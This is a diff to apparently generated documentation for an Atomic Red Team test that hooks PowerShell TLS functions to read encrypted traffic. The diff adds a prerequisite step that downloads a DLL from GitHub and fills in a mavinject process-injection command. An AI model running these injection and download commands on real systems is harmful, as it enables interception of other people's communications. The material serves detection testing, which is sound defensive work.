@@ -454,6 +454,34 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-t1056-004x64-dll-must-exist-on-disk-at-specified-location-file-name">
+         Description: T1056.004x64.dll must exist on disk at specified location (#{file_name})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#check-prereq-commands">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#get-prereq-commands">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#attack-commands-run-with-powershell">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
@@ -503,11 +531,38 @@
 <div class="section" id="atomic-test-1-hook-powershell-tls-encrypt-decrypt-messages">
 <h3>Atomic Test #1 - Hook PowerShell TLS Encrypt/Decrypt Messages<a class="headerlink" href="#atomic-test-1-hook-powershell-tls-encrypt-decrypt-messages" title="Permalink to this headline">¶</a></h3>
 <p>Hooks functions in PowerShell to read TLS Communications</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
+<div class="section" id="dependencies-run-with-powershell">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-t1056-004x64-dll-must-exist-on-disk-at-specified-location-file-name">
+<h5>Description: T1056.004x64.dll must exist on disk at specified location (#{file_name})<a class="headerlink" href="#description-t1056-004x64-dll-must-exist-on-disk-at-specified-location-file-name" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="check-prereq-commands">
+<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1056</span><span class="p">.</span><span class="n">004</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">T1056</span><span class="p">.</span><span class="n">004x64</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="get-prereq-commands">
+<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">split-path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1056</span><span class="p">.</span><span class="n">004</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">T1056</span><span class="p">.</span><span class="n">004x64</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span> <span class="n">-ErrorAction</span> <span class="n">ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\T1056.004\bin\T1056.004x64.dll&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1056</span><span class="o">.</span><span class="mi">004</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">mavinject</span> <span class="nv">$pid</span> <span class="p">/</span><span class="n">INJECTRUNNING</span> <span class="c">#{file_name}</span>
-<span class="nb">curl </span><span class="c">#{server_name}</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>mavinject $pid /INJECTRUNNING PathToAtomicsFolder\T1056.004\bin\T1056.004x64.dll
+curl https://www.example.com
 </pre></div>
 </div>
 <div class="cell docutils container">
